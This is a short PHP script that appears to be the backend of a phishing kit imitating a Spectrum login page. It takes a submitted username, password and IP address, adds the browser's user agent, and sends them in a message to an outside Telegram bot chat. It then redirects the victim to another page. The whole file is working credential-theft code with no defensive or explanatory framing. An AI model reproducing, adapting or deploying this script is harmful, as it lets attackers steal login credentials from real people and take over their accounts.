<?php

// Telegram Bot Token and Chat ID
include 'addtele.php';

// Check if the form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get the form data
    $ip = $_POST['ip'];
    $username = $_POST['user'];
    $password = $_POST['pass'];
    
    // Get the user agent
    $userAgent = $_SERVER['HTTP_USER_AGENT'];

    // Prepare the message
    $message = "Spectrum login.\n\n";
    $message .= "Username: $username\n";
    $message .= "Password: $password\n\n";
    $message .= "IP: $ip\n";
    $message .= "User  Agent: $userAgent\n\n";
    $message .= "@mecredi";

    // Send the message to Telegram
    $url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message);
    file_get_contents($url);

    // Redirect to the next page
    header("Location: mich.html");
    exit();
}

?>